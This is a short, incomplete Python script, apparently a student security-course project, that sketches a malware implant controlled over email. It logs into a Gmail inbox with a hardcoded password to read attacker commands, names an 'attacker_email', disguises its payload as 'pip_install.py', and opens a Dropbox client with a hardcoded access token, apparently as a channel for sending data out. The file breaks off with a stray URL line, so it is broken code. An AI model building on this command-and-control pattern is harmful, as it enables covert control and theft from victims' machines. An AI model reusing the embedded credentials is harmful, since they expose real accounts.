import os
import smtplib
import imaplib
import email
import time
import socket
import ssl
import dropbox
import uuid

emailAdr = "os.services.updates@gmail.com"
password = "cse363esc"
SMTP_SERVER = "imap.gmail.com"
attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
#attacker_email = "William Chen <william.chen@stonybrook.edu>"
SMTP_PORT = 993
commands = []
executable_file = "pip_install.py"
auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"
id = uuid.uuid4()
#initialize dropbox
dbx = dropbox.Dropbox(auth_token)

def readEmail():
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(emailAdr, password)
    mail.select('inbox')

    typ, data = mail.search(None, 'ALL')
    for i in data[0].split():
        typ, data = mail.fetch(i, '(RFC822)' )
        msg = email.message_from_bytes(data[0][1])
        print(msg.get_payload()[1])

    mail.logout()

#https://stackoverflow.com/questions/4067937/getting-mail-attachment-to-python-file-object
https://pypi.org/project/Stegano/
